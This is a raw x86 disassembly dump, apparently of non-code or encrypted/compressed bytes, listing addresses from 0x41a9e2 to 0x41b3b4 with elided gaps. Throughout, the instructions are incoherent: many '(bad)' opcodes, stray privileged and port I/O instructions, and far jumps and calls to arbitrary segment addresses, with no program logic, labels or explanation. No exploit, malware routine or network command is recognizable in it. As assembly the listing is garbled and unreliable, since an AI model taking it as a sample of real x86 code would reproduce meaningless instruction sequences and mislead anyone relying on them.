  41a9e2:	sbb    DWORD PTR [eax+esi*2],ecx
  41a9e5:	mov    ds:0x11e20,eax
  41a9ea:	inc    DWORD PTR [eax]
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ef:	es jb  0x41aa27
  41a9f2:	out    0x53,al
  41a9f4:	mov    al,0xe8
  41a9f6:	mov    eax,0x9c2ceb
  41a9fb:	ret    0x3e02
  41a9fe:	ja     0x41aa26
  41aa00:	mov    dh,0xa1
  41aa02:	jmp    0x4412:0x83164103
  41aa09:	cmp    DWORD PTR [edx-0xa2ae1e9],0x57
  41aa10:	call   0xc09417cc
  41aa15:	push   ds
  41aa16:	repnz test BYTE PTR [esi],bl
  41aa19:	gs aam 0xfe
  41aa1c:	jnp    0x41a9d1
  41aa1e:	cli    
  41aa1f:	retf   0x70f0
  41aa22:	hlt    
  41aa23:	inc    esp
  41aa24:	ficom  WORD PTR [edx+0x22e1c252]
  41aa2a:	test   DWORD PTR [ebx+0x5e],0x667c09d1
  41aa31:	mov    DWORD PTR [esi+0xa],edi
  41aa34:	jmp    0x41aa73
  41aa36:	add    eax,0xd086d339
  41aa3b:	dec    ecx
  41aa3c:	icebp  
  41aa3d:	call   0x4c4a:0xc18659a6
  41aa44:	sbb    DWORD PTR [edi+0x22],0xb2b9303b
  41aa4b:	inc    esi
  41aa4c:	mov    ebp,0x8da95ab
  41aa51:	inc    edx
  41aa52:	mov    WORD PTR [ecx+0x10],ss
  41aa55:	das    
  41aa56:	or     al,0x52
  41aa58:	sub    DWORD PTR [eax],edx
  41aa5a:	mov    esp,DWORD PTR [ecx+0x5]
  41aa5d:	push   0xbc5b99b7
  41aa62:	pop    esi
  41aa63:	inc    esi
  41aa64:	inc    ebx
  41aa65:	jmp    0xa7e2ceb2
  41aa6a:	add    BYTE PTR [ecx-0xc72d45f],ch
  41aa70:	sub    DWORD PTR ds:0x5120c9a0,ebp
  41aa76:	jmp    0xb91552f5
  41aa7b:	mov    edi,0x57d01247
  41aa80:	dec    esi
  41aa81:	(bad)  [ebp+ebp*2-0x7]
  41aa85:	push   es
  41aa86:	mov    edi,0x7f52264c
  41aa8b:	pop    ds
  41aa8c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41aa8e:	das    
  41aa8f:	stos   DWORD PTR es:[edi],eax
  41aa90:	add    DWORD PTR [edi-0x32],esi
  41aa93:	mov    ebx,0x2244da67
  41aa98:	mov    WORD PTR [esp+ebp*8-0x1b],?
  41aa9c:	dec    edx
  41aa9d:	push   es
  41aa9e:	inc    ecx
  41aa9f:	inc    edi
  41aaa0:	in     al,dx
  41aaa1:	mov    dl,0x9c
  41aaa3:	mov    ah,ch
  41aaa5:	inc    ecx
  41aaa6:	js     0x41aaf6
  41aaa8:	pop    ss
  41aaa9:	sbb    DWORD PTR ds:0xca47d9ef,esp
  41aaaf:	in     eax,dx
  41aab0:	sbb    DWORD PTR [edi],ebp
  41aab2:	test   ah,ah
  41aab4:	push   esi
  41aab5:	pop    ebx
  41aab6:	sbb    BYTE PTR [ecx-0x79adf771],cl
  41aabc:	cwde   
  41aabd:	inc    esi
  41aabe:	stc    
  41aabf:	fcomp  QWORD PTR [esp+edi*8]
  41aac2:	adc    edi,DWORD PTR [ebx-0xd]
  41aac5:	xchg   BYTE PTR [edx+0x7e],dh
  41aac8:	pop    ss
  41aac9:	aad    0xda
  41aacb:	sub    eax,DWORD PTR [ebx-0x3af23c3f]
  41aad1:	pop    eax
  41aad2:	mov    al,ds:0x670c12b8
  41aad7:	and    DWORD PTR [ecx+0x64],ecx
  41aada:	loop   0x41ab30
  41aadc:	pop    eax
  41aadd:	adc    ebx,eax
  41aadf:	push   ebp
  41aae0:	je     0x41ab31
  41aae2:	jnp    0x41aada
  41aae4:	xor    BYTE PTR [edx+0x67],ah
  41aae7:	dec    esp
  41aae8:	(bad)  
  41aae9:	push   esi
  41aaea:	mov    ebp,0x4b81
	...
  41ab53:	add    BYTE PTR [eax],al
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	adc    bl,BYTE PTR [eax+0x1f1f7d45]
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	inc    DWORD PTR [eax]
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	test   eax,0xa7cb7888
  41ab73:	test   eax,0x901f1f7b
  41ab78:	or     eax,0x9e718dd8
  41ab7d:	pushf  
  41ab7e:	arpl   WORD PTR [ecx+0x514de5ab],di
  41ab84:	fdivr  st(3),st
  41ab86:	dec    edi
  41ab87:	dec    esp
  41ab88:	loope  0x41ab53
  41ab8a:	push   0xfffffffe
  41ab8c:	ds sbb al,0x0
  41ab8f:	retf   
  41ab90:	cmp    bl,dl
  41ab92:	cwde   
  41ab93:	call   0x6d9c:0x1db6cffa
  41ab9a:	test   al,0xe7
  41ab9c:	jg     0x41ab81
  41ab9e:	mov    ebx,0xd9ce3de9
  41aba3:	dec    esp
  41aba4:	enter  0xa000,0xa7
  41aba8:	push   ds
  41aba9:	jmp    0x9b01b050
  41abae:	stos   DWORD PTR es:[edi],eax
  41abaf:	hlt    
  41abb0:	adc    bl,al
  41abb2:	test   al,0xa8
  41abb4:	cmp    DWORD PTR [ebx+edi*1-0x8fa8c97],esp
  41abbb:	clc    
  41abbc:	ror    DWORD PTR [ebx+0x29],1
  41abbf:	aam    0xf8
  41abc1:	fmulp  st(3),st
  41abc3:	mov    ecx,0xc4bc317d
  41abc8:	jo     0x41ac10
  41abca:	mov    cl,0xb8
  41abcc:	mov    esi,0x65f7702a
  41abd1:	cmp    eax,0xa535fc4f
  41abd6:	xor    eax,edx
  41abd8:	or     al,0xab
  41abda:	jo     0x41ac3e
  41abdc:	push   esi
  41abdd:	add    eax,0x39a821d8
  41abe2:	jle    0x41ac41
  41abe4:	pusha  
  41abe5:	pop    edx
  41abe6:	push   edx
  41abe7:	popa   
  41abe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abe9:	popa   
  41abea:	fstp   TBYTE PTR [eax-0x1c]
  41abed:	(bad)  
  41abee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abef:	scas   al,BYTE PTR es:[edi]
  41abf0:	iret   
  41abf1:	inc    ebp
  41abf2:	test   DWORD PTR [ecx],0xbb853ea
  41abf8:	(bad)  
  41abf9:	enter  0x9971,0x10
  41abfd:	xor    BYTE PTR [ebx-0x10],0x15
  41ac01:	sbb    bl,BYTE PTR [ecx-0x6206ed12]
  41ac07:	mov    al,BYTE PTR ds:0x1ea8beee
  41ac0d:	mov    esi,0x19fdc59c
  41ac12:	mov    ds:0x4052cb0f,al
  41ac17:	(bad)  
  41ac18:	jmp    0x41ac24
  41ac1a:	or     cl,BYTE PTR [edi+edi*1]
  41ac1d:	enter  0xec71,0x97
  41ac21:	xchg   DWORD PTR [eax+esi*8+0x4a204ff4],edx
  41ac28:	mov    ecx,0x426f9646
  41ac2d:	scas   al,BYTE PTR es:[edi]
  41ac2e:	stos   BYTE PTR es:[edi],al
  41ac2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac30:	dec    edi
  41ac31:	bnd jae 0x41ac8f
  41ac34:	es push 0x21
  41ac37:	add    DWORD PTR [edx-0x43],esp
  41ac3a:	call   0x174beace
  41ac3f:	cmp    edx,eax
  41ac41:	int    0x88
  41ac43:	mov    ds,WORD PTR [eax]
  41ac45:	jne    0x41ac0c
  41ac47:	jno    0x41acbe
  41ac49:	cmp    al,0x73
  41ac4b:	outs   dx,DWORD PTR ds:[esi]
  41ac4c:	mov    bl,0x9
  41ac4e:	jmp    0x11ed4d66
  41ac53:	jo     0x41acab
  41ac55:	xor    esi,DWORD PTR [edx+0x65e58fd3]
  41ac5b:	loopne 0x41ac3f
  41ac5d:	jne    0x41ac4a
  41ac5f:	xor    BYTE PTR [ebx-0x4c],bh
  41ac62:	push   cs
  41ac63:	mov    ds:0xbbfbdd1a,eax
  41ac68:	or     BYTE PTR [ebp+0xca172f],ah
	...
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ebp+edx*1-0x22]
  41ace4:	mov    cl,0x5c
  41ace6:	push   ds
  41ace7:	and    BYTE PTR [ecx],al
  41ace9:	add    bh,bh
  41aceb:	add    BYTE PTR [eax],al
  41aced:	add    BYTE PTR [edx],dl
  41acef:	test   al,0x20
  41acf1:	(bad)  [ebx]
  41acf3:	ret    
  41acf4:	cdq    
  41acf5:	mov    cl,0x9b
  41acf7:	aam    0x54
  41acf9:	jmp    0xbebb40cf
  41acfe:	mov    WORD PTR [edi],ss
  41ad00:	jl     0x41acf7
  41ad02:	and    bh,BYTE PTR [ebp-0x5a]
  41ad05:	sbb    esp,eax
  41ad07:	xor    eax,esp
  41ad09:	data16 and al,bh
  41ad0c:	call   0x25c5:0xdf81d9e3
  41ad13:	push   esi
  41ad14:	loope  0x41ad7d
  41ad16:	and    BYTE PTR [eax-0x2c],ch
  41ad19:	pop    ebp
  41ad1a:	cli    
  41ad1b:	scas   eax,DWORD PTR es:[edi]
  41ad1c:	or     al,0x3e
  41ad1e:	mov    edx,0xfc3d9b21
  41ad23:	ja     0x41acf5
  41ad25:	(bad)  
  41ad26:	cmp    BYTE PTR [ecx-0x75],dh
  41ad29:	sahf   
  41ad2a:	pop    ebx
  41ad2b:	jge    0x41ad1e
  41ad2d:	push   esp
  41ad2e:	fisttp WORD PTR [edi]
  41ad30:	dec    edx
  41ad31:	leave  
  41ad32:	(bad)  
  41ad33:	jo     0x41ad69
  41ad35:	inc    ebx
  41ad36:	pop    ss
  41ad37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad38:	idiv   BYTE PTR ds:[ecx]
  41ad3b:	cmc    
  41ad3c:	inc    ecx
  41ad3d:	lods   eax,DWORD PTR ds:[esi]
  41ad3e:	jg     0x41acdd
  41ad40:	int    0xeb
  41ad42:	clc    
  41ad43:	dec    edi
  41ad44:	cmp    eax,0x154e857
  41ad49:	retf   0x3e87
  41ad4c:	push   ebx
  41ad4d:	jmp    0x41ad72
  41ad4f:	mov    dh,0xdc
  41ad51:	test   BYTE PTR [esp+esi*2+0x4f8ba775],dh
  41ad58:	xchg   ebp,eax
  41ad59:	ins    DWORD PTR es:[edi],dx
  41ad5a:	lods   al,BYTE PTR ds:[esi]
  41ad5b:	xchg   esp,eax
  41ad5c:	or     al,0xfe
  41ad5e:	adc    al,0x5e
  41ad60:	lods   eax,DWORD PTR ds:[esi]
  41ad61:	(bad)  
  41ad62:	xchg   ebp,eax
  41ad63:	push   ebp
  41ad64:	jecxz  0x41ad7f
  41ad66:	xchg   ebp,eax
  41ad67:	jmp    0xf8d68ae1
  41ad6c:	(bad)  
  41ad6d:	in     eax,dx
  41ad6e:	ret    
  41ad6f:	sub    edi,DWORD PTR [ecx+0x7a]
  41ad72:	into   
  41ad73:	adc    al,BYTE PTR [ecx]
  41ad75:	ret    0xbbab
  41ad78:	lods   al,BYTE PTR ds:[esi]
  41ad79:	pusha  
  41ad7a:	pop    es
  41ad7b:	imul   ecx,DWORD PTR [ecx-0x2404bbb],0x12238ed9
  41ad85:	cdq    
  41ad86:	rol    BYTE PTR [ebx],cl
  41ad88:	fdivr  DWORD PTR [ebp+edx*8+0x12]
  41ad8c:	inc    BYTE PTR [edx*4-0x6838da08]
  41ad93:	bound  ebx,QWORD PTR [edi-0x7a320e23]
  41ad99:	(bad)  
  41ad9c:	push   cs
  41ad9d:	pop    edi
  41ad9e:	cld    
  41ad9f:	shl    BYTE PTR [ebx+0x6f8d1337],cl
  41ada5:	and    ch,BYTE PTR [edi+0xee08ffa]
  41adab:	imul   ebx,DWORD PTR [edi-0x777a1e4d],0xfaeee709
  41adb5:	xchg   ebx,eax
  41adb6:	sub    al,0xd9
  41adb8:	stos   DWORD PTR es:[edi],eax
  41adb9:	out    0x51,eax
  41adbb:	in     eax,dx
  41adbc:	pop    edi
  41adbd:	jge    0x41adf7
  41adbf:	(bad)  
  41adc0:	pop    ebp
  41adc1:	and    DWORD PTR [edi+edi*2+0x4cd0b783],0x6784ff5d
  41adcc:	mov    esp,ds
  41adce:	sub    edx,esi
  41add0:	xor    al,0x6e
  41add2:	imul   esp,DWORD PTR [ecx],0x262875b9
  41add8:	cld    
  41add9:	pop    ss
  41adda:	hlt    
  41addb:	mov    esi,0xd4ea4b8c
  41ade0:	pop    ds
  41ade1:	mov    eax,ds:0xcf7f19f8
  41ade6:	scas   al,BYTE PTR es:[edi]
  41ade7:	mov    ebx,0xdcd7eb69
  41adec:	adc    al,0x0
	...
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [edx+ecx*8+0x1d84a3c1],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    bh,bh
  41ae6b:	add    BYTE PTR [eax],al
  41ae6d:	add    BYTE PTR ds:0x72e9fb4c,dl
  41ae73:	je     0x41ae0a
  41ae75:	in     eax,dx
  41ae76:	push   ds
  41ae77:	mov    ds:0x405c9b5e,eax
  41ae7c:	retf   0xe707
  41ae7f:	jle    0x41ae91
  41ae81:	adc    al,BYTE PTR [esp+edx*2-0x42]
  41ae85:	out    0x84,eax
  41ae87:	lahf   
  41ae88:	sbb    esi,ebx
  41ae8a:	mov    dh,0x89
  41ae8c:	(bad)  
  41ae8d:	mov    ecx,0xd820a074
  41ae92:	and    al,0xd3
  41ae94:	int3   
  41ae95:	data16 xor ah,ah
  41ae98:	or     DWORD PTR [ebp-0x52],edi
  41ae9b:	cmp    edx,DWORD PTR [ebx+0xe]
  41ae9e:	or     BYTE PTR [esi+0x3e],dh
  41aea1:	mov    edi,0x5296b08b
  41aea6:	pop    ebx
  41aea7:	out    dx,al
  41aea8:	icebp  
  41aea9:	or     ch,BYTE PTR [ecx-0x184c9a22]
  41aeaf:	retf   
  41aeb0:	jmp    0xa0c7f024
  41aeb5:	cmc    
  41aeb6:	test   eax,0x80f9b298
  41aebb:	mov    cl,BYTE PTR [ecx]
  41aebd:	fild   WORD PTR [ecx+0x168dabae]
  41aec3:	inc    ebp
  41aec4:	daa    
  41aec5:	(bad)  
  41aec6:	xchg   ecx,eax
  41aec7:	and    DWORD PTR [eax],0xa42dee45
  41aecd:	out    0x4,eax
  41aecf:	jle    0x41af4c
  41aed1:	push   0x913cf08b
  41aed6:	dec    edi
  41aed7:	sahf   
  41aed8:	je     0x41af41
  41aeda:	mov    ebx,0x9dc4d229
  41aedf:	outs   dx,BYTE PTR ds:[esi]
  41aee0:	inc    edi
  41aee1:	sub    BYTE PTR [ebp+0xf],dh
  41aee4:	jg     0x41af55
  41aee6:	dec    ecx
  41aee7:	and    al,0x70
  41aee9:	jmp    0xc8b3:0xdd1220e4
  41aef0:	test   DWORD PTR [ecx-0x37],ebx
  41aef3:	mov    cl,0x37
  41aef5:	loop   0x41af18
  41aef7:	cld    
  41aef8:	loope  0x41af70
  41aefa:	sbb    al,0x52
  41aefc:	adc    esp,0x5b
  41aeff:	and    eax,0x5f0e7607
  41af04:	push   ss
  41af05:	das    
  41af06:	dec    ecx
  41af07:	leave  
  41af08:	aaa    
  41af09:	test   BYTE PTR [edx+0x1b],0xac
  41af0d:	imul   edx,DWORD PTR [eax-0x45f4d28c],0x522f8817
  41af17:	mov    esi,0x39f1a545
  41af1c:	cmp    al,0xab
  41af1e:	dec    esi
  41af1f:	enter  0xcd50,0xa4
  41af23:	hlt    
  41af24:	or     eax,0x71b221fe
  41af29:	jbe    0x41aef4
  41af2b:	aas    
  41af2c:	iret   
  41af2d:	pop    esi
  41af2e:	out    dx,al
  41af2f:	xchg   esi,eax
  41af30:	fs cmp eax,0xa5e3c40
  41af36:	aam    0x17
  41af38:	(bad)  
  41af39:	fcom   DWORD PTR [esi+0x270754c8]
  41af3f:	ret    0x708f
  41af42:	jle    0x41af81
  41af44:	shr    BYTE PTR [eax-0x6b],cl
  41af47:	xchg   BYTE PTR [eax+0x7e],dh
  41af4a:	mov    eax,0xcae6476c
  41af4f:	and    ecx,DWORD PTR [eax+esi*2-0xf]
  41af53:	add    BYTE PTR [ebp+0x3cae70a0],bh
  41af59:	mov    eax,0x7ca88e9c
  41af5e:	ret    
  41af5f:	fdiv   DWORD PTR [esi-0x56]
  41af62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af64:	(bad)  
  41af65:	mov    dl,0xf1
  41af67:	xchg   edi,eax
  41af68:	xlat   BYTE PTR ds:[ebx]
  41af69:	cmp    eax,0xc43d1f
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x812c44ee
  41afe4:	xor    DWORD PTR [edx+0x1221c],ebx
  41afea:	inc    DWORD PTR [eax]
  41afec:	add    BYTE PTR [eax],al
  41afee:	cmp    BYTE PTR [esi+0x3],bh
  41aff1:	and    DWORD PTR [ecx-0x58],ebx
  41aff4:	in     al,0x80
  41aff6:	mov    ds:0x68f21329,eax
  41affb:	cmp    al,0xe1
  41affd:	es pop ecx
  41afff:	xchg   ebp,eax
  41b000:	ret    
  41b001:	mov    eax,ss
  41b003:	fild   WORD PTR [edx+0x5dff7a74]
  41b009:	sub    BYTE PTR [edx+0x7f],ch
  41b00c:	inc    ebx
  41b00d:	jae    0x41b04f
  41b00f:	fadd   st(4),st
  41b011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b012:	add    edx,ecx
  41b014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b015:	pop    esi
  41b016:	push   0xffffffd0
  41b018:	push   esi
  41b019:	int3   
  41b01a:	inc    esp
  41b01b:	sbb    al,0x5a
  41b01d:	mov    esp,0xe3cde053
  41b022:	lea    edi,[edx]
  41b024:	mov    dl,BYTE PTR [eax+0x7ff8266d]
  41b02a:	sti    
  41b02b:	sub    ch,BYTE PTR [edi-0x37]
  41b02e:	ss out 0x6c,al
  41b031:	fst    DWORD PTR [ebx+0x56]
  41b034:	dec    edi
  41b035:	xor    BYTE PTR [edi-0x15],al
  41b038:	(bad)  
  41b039:	push   esp
  41b03a:	retf   
  41b03b:	mov    ecx,0xe1fad416
  41b040:	push   ebp
  41b041:	dec    DWORD PTR [esi+edi*8-0x65]
  41b045:	div    BYTE PTR [ecx]
  41b047:	cdq    
  41b048:	lods   eax,DWORD PTR ds:[esi]
  41b049:	or     al,0xe4
  41b04b:	aaa    
  41b04c:	push   es
  41b04d:	or     eax,0xa0bf1af1
  41b052:	jg     0x41b0b2
  41b054:	mov    ds:0xca1b0d9c,al
  41b059:	dec    ecx
  41b05a:	xor    eax,0x15b3da1f
  41b05f:	pop    ecx
  41b060:	xchg   esp,eax
  41b061:	mov    ebp,0xc2fb231b
  41b066:	xchg   BYTE PTR [edi],bl
  41b068:	or     ebp,DWORD PTR [ecx+0x2ba5769e]
  41b06e:	test   DWORD PTR [ecx],ecx
  41b070:	adc    al,0x42
  41b072:	or     DWORD PTR [ebx-0xf98992a],ecx
  41b078:	or     edi,DWORD PTR [edx-0x62]
  41b07b:	mov    esp,0xb1d464b0
  41b080:	mov    ds:0xf9bfa50a,eax
  41b085:	dec    esp
  41b086:	mov    edi,DWORD PTR [ebx-0x72]
  41b089:	cmp    al,0x9b
  41b08b:	jmp    0x33b4125a
  41b090:	pop    esi
  41b091:	pop    ss
  41b092:	aad    0x54
  41b094:	pop    eax
  41b095:	inc    ebx
  41b096:	mov    cs,WORD PTR [eax]
  41b098:	inc    edi
  41b099:	js     0x41b090
  41b09b:	std    
  41b09c:	push   eax
  41b09d:	mov    al,0x5a
  41b09f:	jmp    0x41b08f
  41b0a1:	push   ebx
  41b0a2:	addr16 mov bh,0x9b
  41b0a5:	mov    ds:0x355a37db,al
  41b0aa:	loopne 0x41b11c
  41b0ac:	sahf   
  41b0ad:	pop    ebx
  41b0ae:	fwait
  41b0af:	mov    eax,0x66bb0976
  41b0b4:	cs dec edx
  41b0b6:	jns    0x41b0c5
  41b0b8:	out    0xea,al
  41b0ba:	sbb    ebp,0xffffffde
  41b0bd:	pop    es
  41b0be:	mov    cl,0x8
  41b0c0:	push   gs
  41b0c2:	stos   BYTE PTR es:[edi],al
  41b0c3:	das    
  41b0c4:	stc    
  41b0c5:	ja     0x41b143
  41b0c7:	adc    dl,BYTE PTR [ebx]
  41b0c9:	jno    0x41b0b5
  41b0cb:	adc    edi,DWORD PTR [edi]
  41b0cd:	daa    
  41b0ce:	aad    0xbc
  41b0d0:	push   edi
  41b0d1:	aas    
  41b0d2:	jns    0x41b138
  41b0d4:	(bad)  
  41b0d5:	jo     0x41b0fa
  41b0d7:	in     al,dx
  41b0d8:	jge    0x41b0e5
  41b0da:	pop    ecx
  41b0db:	pop    eax
  41b0dc:	dec    eax
  41b0dd:	fidiv  DWORD PTR [ecx+0x49]
  41b0e0:	lock outs dx,DWORD PTR ds:[esi]
  41b0e2:	sti    
  41b0e3:	dec    esi
  41b0e4:	in     eax,0xed
  41b0e6:	dec    ebx
  41b0e7:	mov    edi,0x4ed1c64
  41b0ec:	stc    
	...
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x1d54aba0
  41b166:	sbb    esp,DWORD PTR [ebx]
  41b168:	add    DWORD PTR [eax],eax
  41b16a:	inc    DWORD PTR [eax]
  41b16c:	add    BYTE PTR [eax],al
  41b16e:	popa   
  41b16f:	fisub  WORD PTR [edx]
  41b171:	outs   dx,BYTE PTR ds:[esi]
  41b172:	mov    ah,0xe0
  41b174:	and    al,0xcb
  41b176:	loope  0x41b1cc
  41b178:	cmp    DWORD PTR [esi-0x3ad4d914],edx
  41b17e:	in     eax,dx
  41b17f:	jecxz  0x41b1e5
  41b181:	aam    0xd5
  41b183:	jle    0x41b13a
  41b185:	jns    0x41b1d0
  41b187:	xor    ah,BYTE PTR [ecx-0x849482a]
  41b18d:	jl     0x41b1c8
  41b18f:	into   
  41b190:	into   
  41b191:	lock pop ds
  41b193:	xlat   BYTE PTR ds:[ebx]
  41b194:	dec    edx
  41b195:	ds jne 0x41b213
  41b198:	cmp    al,0xe4
  41b19a:	dec    edx
  41b19b:	cwde   
  41b19c:	lods   eax,DWORD PTR ds:[esi]
  41b19d:	mov    ah,0x3f
  41b19f:	mov    esi,0x3d0b7384
  41b1a4:	push   esi
  41b1a5:	pusha  
  41b1a6:	test   DWORD PTR [edi+0xcb6ba4e],edi
  41b1ac:	and    DWORD PTR [edi+0x14e69a86],esp
  41b1b2:	inc    ebp
  41b1b3:	jle    0x41b233
  41b1b5:	shl    BYTE PTR [edx],0xd
  41b1b8:	mov    DWORD PTR ds:0xbb50b297,0x63c1bee7
  41b1c2:	(bad)  
  41b1c3:	imul   eax,DWORD PTR [eax-0x24],0x7
  41b1c7:	mov    edi,0x5377f9d3
  41b1cc:	test   ah,ch
  41b1ce:	pop    es
  41b1cf:	std    
  41b1d0:	std    
  41b1d1:	ins    DWORD PTR es:[edi],dx
  41b1d2:	push   ss
  41b1d3:	mov    ecx,0x73885021
  41b1d8:	sub    BYTE PTR [ebx+eax*4],cl
  41b1db:	pop    ds
  41b1dc:	ja     0x41b177
  41b1de:	or     edx,esp
  41b1e0:	cwde   
  41b1e1:	fwait
  41b1e2:	pop    edx
  41b1e3:	dec    edi
  41b1e4:	pushf  
  41b1e5:	sbb    al,0xce
  41b1e7:	mov    esi,0x63e78cea
  41b1ec:	xchg   ebx,eax
  41b1ed:	xor    al,0x1a
  41b1ef:	cmp    eax,ebp
  41b1f1:	push   ss
  41b1f2:	add    eax,0xf491c2ef
  41b1f7:	sbb    eax,0x64a2c904
  41b1fc:	imul   eax,ecx,0x333ea760
  41b202:	mov    ah,BYTE PTR [ecx-0x74]
  41b205:	pop    ecx
  41b206:	adc    eax,0x70ea2b1e
  41b20b:	mov    bh,0x14
  41b20d:	jg     0x41b1ba
  41b20f:	mov    bl,0x32
  41b211:	repz add DWORD PTR [esi],eax
  41b214:	ins    BYTE PTR es:[edi],dx
  41b215:	inc    ecx
  41b216:	(bad)  
  41b218:	fstp   TBYTE PTR [ebp+0x14]
  41b21b:	rol    DWORD PTR ds:0x3f27ee01,cl
  41b221:	fbstp  TBYTE PTR [ecx-0x10f3a395]
  41b227:	jmp    0x56b27e91
  41b22c:	cwde   
  41b22d:	sub    dh,BYTE PTR [ebx-0x52]
  41b230:	push   ecx
  41b231:	(bad)  
  41b232:	mov    WORD PTR [edx+0x4b7c6ad2],?
  41b238:	cmp    BYTE PTR [edx-0x5b],bl
  41b23b:	stos   BYTE PTR es:[edi],al
  41b23c:	pop    ds
  41b23d:	loopne 0x41b28b
  41b23f:	jbe    0x41b23d
  41b241:	in     eax,dx
  41b242:	cmp    ah,ah
  41b244:	retf   
  41b245:	fdiv   DWORD PTR [ebx]
  41b247:	push   0xd
  41b249:	jno    0x41b1e2
  41b24b:	xor    al,0xf
  41b24d:	lods   eax,DWORD PTR ds:[esi]
  41b24e:	std    
  41b24f:	adc    DWORD PTR [eax],esp
  41b251:	jb     0x41b203
  41b253:	add    DWORD PTR [ebx],ecx
  41b255:	sbb    BYTE PTR [edi+eiz*8-0x23dae6e6],dh
  41b25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b25d:	sahf   
  41b25e:	lods   al,BYTE PTR ds:[esi]
  41b25f:	into   
  41b260:	das    
  41b261:	sbb    DWORD PTR [eax],0x67
  41b264:	jnp    0x41b209
  41b266:	push   esp
  41b267:	jge    0x41b247
  41b269:	bswap  ecx
  41b26b:	je     0x41b2b3
	...
  41b2d5:	add    BYTE PTR [esi+0x6be069a5],cl
  41b2db:	in     al,dx
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     dl,ah
  41b2e3:	push   ds
  41b2e4:	pop    edx
  41b2e5:	inc    esp
  41b2e6:	sbb    ah,BYTE PTR [ecx+eax*1]
  41b2e9:	add    bh,bh
  41b2eb:	add    BYTE PTR [eax],al
  41b2ed:	add    BYTE PTR [ecx],bh
  41b2ef:	and    ebp,ebx
  41b2f1:	call   0xc02f7164
  41b2f6:	xor    DWORD PTR fs:[edi+0x237ac04a],eax
  41b2fd:	pop    esi
  41b2fe:	sbb    BYTE PTR [ebp+0x40],ch
  41b301:	pop    es
  41b302:	pop    edi
  41b303:	stos   DWORD PTR es:[edi],eax
  41b304:	push   ebp
  41b305:	mov    bh,0x48
  41b307:	fcom   DWORD PTR [ebx]
  41b309:	dec    eax
  41b30a:	test   eax,0xca6201aa
  41b30f:	sbb    edi,DWORD PTR [ecx+0x28350fb7]
  41b315:	mov    gs,edi
  41b317:	mov    ds:0x26c6aef1,eax
  41b31c:	cmp    al,0x76
  41b31e:	add    ah,BYTE PTR [ebp+0x29]
  41b321:	jne    0x41b2f0
  41b323:	jnp    0x41b2e0
  41b325:	xor    BYTE PTR [ecx-0x2],dh
  41b328:	inc    edx
  41b329:	add    DWORD PTR [ebx+eax*4],0x7b916ed7
  41b330:	in     al,0xa7
  41b332:	jg     0x41b36e
  41b334:	lds    edi,FWORD PTR [esi+eiz*2-0x3a314a19]
  41b33b:	lock sbb BYTE PTR [edi+0x1d],al
  41b33f:	les    esi,FWORD PTR [esi*4+0x3ebf678d]
  41b346:	jp     0x41b344
  41b348:	jge    0x41b314
  41b34a:	js     0x41b2e6
  41b34c:	jo     0x41b37c
  41b34e:	cmp    DWORD PTR [eax+0x65d4fa65],0x720563d2
  41b358:	jg     0x41b3b1
  41b35a:	pop    esp
  41b35b:	aas    
  41b35c:	enter  0x685c,0x10
  41b360:	xchg   ecx,eax
  41b361:	hlt    
  41b362:	ds test edx,ebx
  41b365:	or     BYTE PTR [eax],bl
  41b367:	xor    DWORD PTR [edx+0x585d17ed],ebp
  41b36d:	stos   BYTE PTR es:[edi],al
  41b36e:	mov    dh,BYTE PTR [ebx-0x58ddd8a]
  41b374:	test   al,0xd
  41b376:	sti    
  41b377:	mov    dh,0xfe
  41b379:	shl    esp,0xac
  41b37c:	xchg   DWORD PTR [ecx],ebp
  41b37e:	sub    DWORD PTR [ebx+edx*4+0x15],edi
  41b382:	(bad)  
  41b383:	imul   DWORD PTR [ecx]
  41b385:	push   ebp
  41b386:	push   eax
  41b387:	mov    ebp,0x7110f0ec
  41b38c:	inc    esp
  41b38d:	rcl    BYTE PTR [ebx],cl
  41b38f:	ds jae 0x41b337
  41b392:	jb     0x41b383
  41b394:	xor    ebp,DWORD PTR [ecx]
  41b396:	js     0x41b35a
  41b398:	fidiv  WORD PTR [edi-0x72]
  41b39b:	rcl    BYTE PTR [ebx-0x158f0118],1
  41b3a1:	in     al,0x34
  41b3a3:	iret   
  41b3a4:	retf   0xe8ae
  41b3a7:	(bad)  
  41b3a8:	mov    eax,0x2668da5d
  41b3ad:	mov    ecx,DWORD PTR [edi+0x35]
  41b3b0:	loop   0x41b3e4
  41b3b2:	xchg   edx,eax
  41b3b3:	xlat   BYTE PTR ds:[ebx]
  41b3b4:	and    al,0xa5
